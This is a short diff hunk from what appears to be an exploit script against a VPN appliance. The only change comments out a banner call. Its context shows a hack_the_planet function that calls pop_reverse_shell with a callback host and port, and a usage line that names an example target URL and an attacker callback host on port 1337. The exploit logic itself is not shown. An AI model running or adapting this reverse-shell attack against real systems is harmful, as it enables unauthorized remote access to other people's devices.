@@ -90,7 +90,7 @@ def hack_the_planet(target, cb_host, cb_port):
     pop_reverse_shell(target=target, cb_host=cb_host, cb_port=cb_port)
 
 def main(args):
-    banner()
+    #banner()
     if len(args) != 4:
         sys.exit("use: %s https://some-vpn.lol:8090 hacke.rs 1337" %(args[0]))
     hack_the_planet(target=args[1], cb_host=args[2], cb_port=args[3])
